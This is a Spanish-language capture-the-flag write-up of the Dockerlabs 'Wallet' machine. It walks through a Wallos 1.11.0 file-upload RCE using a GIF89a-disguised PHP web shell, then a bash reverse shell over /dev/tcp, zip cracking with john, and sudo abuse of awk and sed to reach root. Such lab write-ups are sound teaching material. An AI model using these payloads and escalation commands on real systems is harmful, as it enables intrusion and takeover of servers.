
# Writeup Template: Maquina `[ Wallet ]`

- Tags: #Wallet #Wallos #Base64Files
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Wallet](https://mega.nz/file/QStynIiQ#x8_w2YlVDAG8EiHcm7Vj3JDseae-Rz_v5IsBzQ8-hGQ) Laboratorio centrado en vulnerabilidades de seguridad en sistemas de billeteras digitales.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x wallet.zip
sudo bash auto_deploy.sh wallet.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.59 ((DebianSid))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio: Tenemso **hostDiscovery**, Asi que agregamos esta linea a nuestro archivo **/etc/passwd**
```bash
172.17.0.2 wallet.dl
```

```bash
http://wallet.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://wallet.dl/
http://wallet.dl/ [200 OK] Apache[2.4.59], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], JQuery[3.4.1], Script[text/javascript], Title[Wallet], X-UA-Compatible[IE=edge]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 wallet.dl
```

Reporte:
```bash
/css/: Potentially interesting directory w/ listing on 'apache/2.4.59 (debian)'
/images/: Potentially interesting directory w/ listing on 'apache/2.4.59 (debian)'
/js/: Potentially interesting directory w/ listing on 'apache/2.4.59 (debian)'
```

Ahora realizamos descubrimiendo de subdominios:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -H "Host:FUZZ.wallet.dl" -u 172.17.0.2 --hh=302,7022
```

Tenemos un nuevo subdominio
```bash
000005122:   302        0 L      0 W        0 Ch        "panel"
```

Ahora este subdominio lo agregamos a nuestro archivo **/etc/hosts**
```bash
172.17.0.2 wallet.dl panel.wallet.dl
```

Ahora tenemos este servicio donde nos permite registrarnos y obtener una cuenta:
```bash
http://panel.wallet.dl/registration.php
```
### Descubrimiento de Rutas
Antes de registrarnos realizaremos fuzzing de rutas:
```bash
gobuster dir -u http://panel.wallet.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/images/              (Status: 200) [Size: 2971]
/screenshots/         (Status: 200) [Size: 2002]
/scripts/             (Status: 200) [Size: 2316]
/includes/            (Status: 200) [Size: 3713]
/db/                  (Status: 200) [Size: 935]
/styles/              (Status: 200) [Size: 1978]
/libs/                (Status: 200) [Size: 940]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://panel.wallet.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.php            (Status: 302) [Size: 0] [--> login.php]
/about.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 302) [Size: 0] [--> registration.php]
/images               (Status: 301) [Size: 319] [--> http://panel.wallet.dl/images/]
/logos.php            (Status: 200) [Size: 1977]
/stats.php            (Status: 302) [Size: 0] [--> login.php]
/screenshots          (Status: 301) [Size: 324] [--> http://panel.wallet.dl/screenshots/]
/scripts              (Status: 301) [Size: 320] [--> http://panel.wallet.dl/scripts/]
/registration.php     (Status: 200) [Size: 7256]
/includes             (Status: 301) [Size: 321] [--> http://panel.wallet.dl/includes/]
/db                   (Status: 301) [Size: 315] [--> http://panel.wallet.dl/db/]
/logout.php           (Status: 302) [Size: 0] [--> .]
/styles               (Status: 301) [Size: 319] [--> http://panel.wallet.dl/styles/]
/settings.php         (Status: 302) [Size: 0] [--> login.php]
/auth.php             (Status: 200) [Size: 0]
/startup.sh           (Status: 200) [Size: 1025]
/libs                 (Status: 301) [Size: 317] [--> http://panel.wallet.dl/libs/]
```

Procedemos a lanzar **burpsuite** para poder interceptar la peticion al registrarnos y asi poder ver como es que se esta tramitando la data:
```bash
burpsuite &>/dev/null & disown
```

Ahora que interceptamos la peticion la mandamos la modo **repeater** y tenemos la siguiente data que se esta tramitando por el metodo **POST**
```bash
POST /registration.php HTTP/1.1
Host: panel.wallet.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: http://panel.wallet.dl
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://panel.wallet.dl/registration.php
Cookie: PHPSESSID=e4p79va03obqvdjbk2hsn90hmo; language=es
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=test&email=test%40test.com&password=test123&confirm_password=test123&main_currency=2&language=es
```

Ahora ya tenemos el **login** para inciar sesion
```bash
http://panel.wallet.dl/login.php
```

Una ves logueados tenemos el panel de inicio:
```bash
http://panel.wallet.dl/
```

Tenemos un boton que nos permite **anadir subscripcion** aqui realizaremos pruebas:
Realizaremos una nueva subscripcion, De igual manera la interceptaremos para ver como es que se esta tramitando la data:
Tenemos una peticion que se esta tramitando por el metodo **POST**
```bash
POST /endpoints/subscription/add.php HTTP/1.1
Host: panel.wallet.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://panel.wallet.dl/
Content-Type: multipart/form-data; boundary=---------------------------5955004932855136474046085612
Content-Length: 1720
Origin: http://panel.wallet.dl
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: theme=light; PHPSESSID=e4p79va03obqvdjbk2hsn90hmo; language=es; theme=light
Priority: u=0

-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="name"

test
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="logo"; filename=""
Content-Type: application/octet-stream


-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="logo-url"


-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="id"


-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="price"

1000
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="currency_id"

2
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="frequency"

1
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="cycle"

3
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="next_payment"

2025-07-24
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="payment_method_id"

1
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="category_id"

3
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="payer_user_id"

1
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="url"

www.test.com
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="notes"

pagar
-----------------------------5955004932855136474046085612--
```

Revisando la version de este servicio en la siguiente ruta:
```bash
http://panel.wallet.dl/about.php
```

```bash
## Acerca de y Créditos

Wallos v1.11.0
Licencia: GPLv3[](https://www.gnu.org/licenses/gpl-3.0.en.html "Visitar URL Externa")
Problemas y Solicitudes: GitHub[](https://github.com/ellite/Wallos/issues "Visitar URL Externa")
El autor: https://henrique.pt[](https://henrique.pt/ "Visitar URL Externa")
Iconos: https://www.streamlinehq.com/freebies/plump-flat-free[](https://www.streamlinehq.com/freebies/plump-flat-free "Visitar URL Externa")
Iconos de Pago: https://www.figma.com/file/5IMW8JfoXfB5GRlPNdTyeg/Credit-Cards-and-Payment-Methods-Icons-(Community)[](https://www.figma.com/file/5IMW8JfoXfB5GRlPNdTyeg/Credit-Cards-and-Payment-Methods-Icons-\(Community\) "Visitar URL Externa")
Chart.js: https://www.chartjs.org/[](https://www.chartjs.org/ "Visitar URL Externa")
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos la version, Buscamos por un exploit:
```bash
searchsploit wallos 1.11.0
```

Tenemos el siguiente resultado:
```bash
 Exploit Title  |  Path
-----------------------------------------
Wallos < 1.11.2 - File Upload RCE    | php/webapps/51924.txt
```

Si revisamos el contendio del exploit para ver como es que funciona:
Vemos que el exploit Wallos te permite subir una imagen o logotipo al crear una nueva suscripción. Esto se puede omitir para subir un archivo .php malicioso.
Revisando el script vemos que el punto vulnerable es al cargar un **logotipo** ahi inyectaremos un archvio malicioso basado en los **magicNumber** para que pase como si de una imagen legitima se tratase
Explicacion de lo que tenemo que hacer para derivar a un **RCE**
```bash
searchsploit -x php/webapps/51924.txt

-----------------------------29251442139477260933920738324
Content-Disposition: form-data; name="logo"; filename="revshell.php"
Content-Type: image/jpeg
GIF89a;

<?php
system($_GET['cmd']);
?>
```

En este fragmento nos indica que tenemos que envenear de esta manera la parte del **logo** en la peticion que previamente ya teniamos capturada con burpsuite
```bash
POST /endpoints/subscription/add.php HTTP/1.1
```

Ahora en la peticion procedemos a envenenarla del manera que quede asi ya con el codigo malicioso inyectamos y enviamos la peticion:
```bash
POST /endpoints/subscription/add.php HTTP/1.1
Host: panel.wallet.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://panel.wallet.dl/
Content-Type: multipart/form-data; boundary=---------------------------5955004932855136474046085612
Content-Length: 1752
Origin: http://panel.wallet.dl
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: theme=light; PHPSESSID=e4p79va03obqvdjbk2hsn90hmo; language=es; theme=light
Priority: u=0

-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="name"

test
-----------------------------5955004932855136474046085612
Content-Disposition: form-data; name="logo"; filename="shell.php"
Content-Type: image/jpeg
GIF89a;
<?php
	system($_GET['cmd']);
?>
```

Una ves cargada el exploit nos indica que tenemos que buscar en esta ruta nuestro archvio malicioso:
```bash
6) Your file will be located in:
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php
```
### Ejecucion del Ataque
Procedemos a buscar nuestro archivo malicioso, Para ejecutar comandos
```bash
# Comandos para explotación
http://panel.wallet.dl/images/uploads/logos/1752000676-hacked.php?cmd=whoami
```

Tenemos ejecucion remota de comandos de manera exitosa
```bash
GIF89a; www-data
```
### Intrusion
Ahora nos ponemos en Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://panel.wallet.dl/images/uploads/logos/1752000676-hacked.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
pylon:x:1000:1000:pylon,,,:/home/pylon:/bin/bash
pinguino:x:1001:1001:pinguino,,,:/home/pinguino:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Ahora sabiendo los usuarios del sistema, Procedemos a listar los permisos de este usuario:
```bash
sudo -l

User www-data may run the following commands on d11a25fcd716:
    (pylon) NOPASSWD: /usr/bin/awk
```

Procedemos a explotar el privilegio para ganar acceso como el usuario **pylon**
```bash
sudo -u pylon /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

###### Usuario `[ Pylon ]`:
Listando los archivos para este usuario tenemos un comprimido:
```bash
ls -la

-rw-r--r-- 1 pylon pylon  235 Jul 12  2024 secretitotraviesito.zip
```

Descomprimimos el archivo:
```bash
unzip secretitotraviesito.zip 
Archive:  secretitotraviesito.zip
```

Pero no podemos obtener ya que necesitamos una contrasena:
```bash
[secretitotraviesito.zip] notitachingona.txt password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: notitachingona.txt      incorrect password
```

Lo que aremos es transferir con **base64** el comprimido asi que primero en la maquina victima convertimos:
```bash
# Maquina victima
base64 secretitotraviesito.zip

UEsDBBQACQAIAOdC7FiFVsOKIQAAABkAAAASABwAbm90aXRhY2hpbmdvbmEudHh0VVQJAAPx55Bm
8eeQZnV4CwABBOgDAAAE6AMAAJQl5oY0Dvf43JObusEOgH5BrIiUqdx+by9DgXMhrefNolBLBwiF
VsOKIQAAABkAAABQSwECHgMUAAkACADnQuxYhVbDiiEAAAAZAAAAEgAYAAAAAAABAAAApIEAAAAA
bm90aXRhY2hpbmdvbmEudHh0VVQFAAPx55BmdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWAAA
AH0AAAAAAA==
```

Ahora desde nuestra maquina atacante lo transferimos:
```bash
echo "UEsDBBQACQAIAOdC7FiFVsOKIQAAABkAAAASABwAbm90aXRhY2hpbmdvbmEudHh0VVQJAAPx55Bm
8eeQZnV4CwABBOgDAAAE6AMAAJQl5oY0Dvf43JObusEOgH5BrIiUqdx+by9DgXMhrefNolBLBwiF
VsOKIQAAABkAAABQSwECHgMUAAkACADnQuxYhVbDiiEAAAAZAAAAEgAYAAAAAAABAAAApIEAAAAA
bm90aXRhY2hpbmdvbmEudHh0VVQFAAPx55BmdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWAAA
AH0AAAAAAA==" | base64 -d > secretitotraviesito.zip
```

Ahora tenemos de manera exitosa en nuestra maquina atacante, Ahora lo que aremos para crakeralo con **john**
```bash
zip2john secretitotraviesito.zip > hash
ver 2.0 efh 5455 efh 7875 secretitotraviesito.zip/notitachingona.txt PKZIP Encr: TS_chk, cmplen=33, decmplen=25, crc=8AC35685 ts=42E7 cs=42e7 type=8
```

Ahora con **john** realizamos ataque de fuerza bruta:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Tenemos la contrasena:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate1       (secretitotraviesito.zip/notitachingona.txt)
```

Ahora descomprimimos el archivo
```bash
7z x secretitotraviesito.zip

Enter password (will not be echoed): # chocolate1
Everything is Ok
```

Ahora tenemos un archivo: **notitachingona.txt**, Revisamos su contenido:
```bash
File: notitachingona.txt
────────────────────────
pinguino:pinguinomaloteh
```

Tenemos la contrasena del usuario **pinguino** asi que nos loguemamos.
```bash
su pinguino # ( pinguinomaloteh )
```

###### Usuario `[ Pinguino ]`:
Listando los permisos para este usuario tenemos:
```bash
sudo -l

User pinguino may run the following commands on d11a25fcd716:
    (ALL) NOPASSWD: /usr/bin/sed
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@d11a25fcd716:/var/mail# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enviar archivos atraves del binario **base64**
2. Aprendimos a explotar el binario de **sed**